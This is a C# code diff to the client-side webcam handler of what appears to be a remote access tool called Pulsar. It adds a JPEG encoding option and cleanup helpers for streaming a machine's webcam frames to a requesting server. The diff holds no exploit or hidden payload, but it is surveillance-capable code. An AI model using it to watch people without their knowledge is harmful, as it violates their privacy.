@@ -3,6 +3,7 @@ using Pulsar.Common.Enums;
 using Pulsar.Common.Networking;
 using Pulsar.Common.Video;
 using Pulsar.Common.Video.Codecs;
+using Pulsar.Common.Video.Compression;
 using System;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -18,6 +19,12 @@ namespace Pulsar.Client.Messages
     public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
     {
         private UnsafeStreamCodec _streamCodec;
+        private JpgCompression _jpgCompression;
+        private int _currentJpegQuality = -1;
+        private WebcamEncoding _encoding = WebcamEncoding.Stream;
+        private Resolution _currentResolution;
+        private int _currentQualitySetting;
+        private int _currentMonitorIndex;
         private BitmapData _webcamData = null;
         private Bitmap _webcam = null;
         private ISender _clientMain;
@@ -71,6 +78,59 @@ namespace Pulsar.Client.Messages
             }
             else if (message.Status == RemoteWebcamStatus.Continue)
             {
+                if (message.Encoding != _encoding)
+                {
+                    _encoding = message.Encoding;
+                    if (_encoding == WebcamEncoding.Stream)
+                    {
+                        var resolution = EnsureCurrentResolution();
+                        try
+                        {
+                            DisposeStreamCodec();
+                            _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error switching to stream codec: {ex.Message}");
+                        }
+                    }
+                    else
+                    {
+                        DisposeStreamCodec();
+                    }
+                }
+
+                _currentQualitySetting = message.Quality;
+                _currentMonitorIndex = message.DisplayIndex;
+
+                if (_encoding == WebcamEncoding.Stream)
+                {
+                    var resolution = EnsureCurrentResolution();
+                    if (_streamCodec == null || _streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
+                    {
+                        try
+                        {
+                            DisposeStreamCodec();
+                            _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error refreshing stream codec: {ex.Message}");
+                        }
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        EnsureJpegCompression(message.Quality);
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error refreshing JPEG compression: {ex.Message}");
+                    }
+                }
+
                 // server is requesting more frames
                 Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                 _frameRequestEvent.Set();
@@ -96,29 +156,57 @@ namespace Pulsar.Client.Messages
                 var webcamBounds = _webcamHelper.GetBounds();
                 var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
 
-                try
+                _encoding = message.Encoding;
+                _currentQualitySetting = message.Quality;
+                _currentMonitorIndex = message.DisplayIndex;
+                _currentResolution = resolution;
+
+                if (_encoding == WebcamEncoding.Stream)
                 {
-                    if (_streamCodec == null)
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                    DisposeJpegCompression();
 
-                    if (message.CreateNew)
+                    try
                     {
-                        _streamCodec?.Dispose();
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                        OnReport("Remote webcam session started");
+                        if (_streamCodec == null)
+                            _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+
+                        if (message.CreateNew)
+                        {
+                            _streamCodec?.Dispose();
+                            _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                            OnReport("Remote webcam session started");
+                        }
+
+                        if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
+                        {
+                            _streamCodec?.Dispose();
+                            _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        }
                     }
-
-                    if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
+                    catch (Exception ex)
                     {
-                        _streamCodec?.Dispose();
-                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        Debug.WriteLine($"Error initializing stream codec: {ex.Message}");
+                        OnReport("Failed to initialize stream codec: " + ex.Message);
+                        return;
                     }
                 }
-                catch (Exception ex)
+                else
                 {
-                    Debug.WriteLine($"Error initializing stream codec: {ex.Message}");
-                    OnReport("Failed to initialize stream codec: " + ex.Message);
-                    return;
+                    DisposeStreamCodec();
+                    try
+                    {
+                        EnsureJpegCompression(message.Quality);
+                        if (message.CreateNew)
+                        {
+                            OnReport("Remote webcam session started");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error initializing JPEG compression: {ex.Message}");
+                        OnReport("Failed to initialize JPEG compression: " + ex.Message);
+                        return;
+                    }
                 }
 
                 _clientMain = client;
@@ -204,18 +292,13 @@ namespace Pulsar.Client.Messages
                     _webcam = null;
                 }
 
-                if (_streamCodec != null)
-                {
-                    try
-                    {
-                        _streamCodec.Dispose();
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error disposing stream codec: {ex.Message}");
-                    }
-                    _streamCodec = null;
-                }
+                DisposeStreamCodec();
+
+                DisposeJpegCompression();
+                _encoding = WebcamEncoding.Stream;
+                _currentResolution = null;
+                _currentMonitorIndex = 0;
+                _currentQualitySetting = 0;
 
                 // clear the buffer
                 ClearFrameBuffer();
@@ -225,6 +308,72 @@ namespace Pulsar.Client.Messages
             {
                 Debug.WriteLine($"Unexpected error in StopWebcamStreaming: {ex.Message}");
             }
+        }
+
+        private void DisposeStreamCodec()
+        {
+            if (_streamCodec != null)
+            {
+                try
+                {
+                    _streamCodec.Dispose();
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error disposing stream codec: {ex.Message}");
+                }
+                _streamCodec = null;
+            }
+        }
+
+        private void DisposeJpegCompression()
+        {
+            if (_jpgCompression != null)
+            {
+                try
+                {
+                    _jpgCompression.Dispose();
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error disposing JPEG compression: {ex.Message}");
+                }
+                _jpgCompression = null;
+                _currentJpegQuality = -1;
+            }
+        }
+
+        private void EnsureJpegCompression(int quality)
+        {
+            int clampedQuality = quality;
+            if (clampedQuality < 0) clampedQuality = 0;
+            if (clampedQuality > 100) clampedQuality = 100;
+
+            if (_jpgCompression == null || _currentJpegQuality != clampedQuality)
+            {
+                DisposeJpegCompression();
+                _jpgCompression = new JpgCompression(clampedQuality);
+                _currentJpegQuality = clampedQuality;
+            }
+        }
+
+        private Resolution EnsureCurrentResolution()
+        {
+            if (_currentResolution == null)
+            {
+                try
+                {
+                    var bounds = _webcamHelper.GetBounds();
+                    _currentResolution = new Resolution { Width = bounds.Width, Height = bounds.Height };
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error retrieving webcam bounds: {ex.Message}");
+                    _currentResolution = new Resolution { Width = 0, Height = 0 };
+                }
+            }
+
+            return _currentResolution;
         }
 
         private void BufferedCaptureLoop(CancellationToken cancellationToken)
@@ -296,7 +445,7 @@ namespace Pulsar.Client.Messages
 
                 const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
                 Bitmap processedBitmap = _webcam;
-                
+
                 if (_webcam.PixelFormat != codecPixelFormat)
                 {
                     try
@@ -316,17 +465,29 @@ namespace Pulsar.Client.Messages
                     }
                 }
 
-                _webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
-                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
-
                 _reusableStream.Position = 0;
                 _reusableStream.SetLength(0);
 
-                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                _streamCodec.CodeImage(_webcamData.Scan0,
-                    new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
-                    new Size(processedBitmap.Width, processedBitmap.Height),
-                    processedBitmap.PixelFormat, _reusableStream);
+                if (_encoding == WebcamEncoding.Jpeg)
+                {
+                    EnsureJpegCompression(_currentQualitySetting);
+                    if (_jpgCompression == null)
+                        throw new Exception("JPEG compression is not initialized.");
+
+                    _jpgCompression.Compress(processedBitmap, _reusableStream);
+                }
+                else
+                {
+                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
+
+                    _webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                        ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
+
+                    _streamCodec.CodeImage(_webcamData.Scan0,
+                        new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                        new Size(processedBitmap.Width, processedBitmap.Height),
+                        processedBitmap.PixelFormat, _reusableStream);
+                }
 
                 return _reusableStream.ToArray();
             }
@@ -353,12 +514,14 @@ namespace Pulsar.Client.Messages
 
             try
             {
+                var resolution = _currentResolution ?? EnsureCurrentResolution();
                 var response = new GetWebcamResponse
                 {
                     Image = frameData,
-                    Quality = _streamCodec.ImageQuality,
-                    Monitor = _streamCodec.Monitor,
-                    Resolution = _streamCodec.Resolution,
+                    Quality = _currentQualitySetting,
+                    Monitor = _currentMonitorIndex,
+                    Resolution = resolution,
+                    Encoding = _encoding,
                     IsLastRequestedFrame = isLastRequestedFrame,
                     FrameRate = 0f
                 };
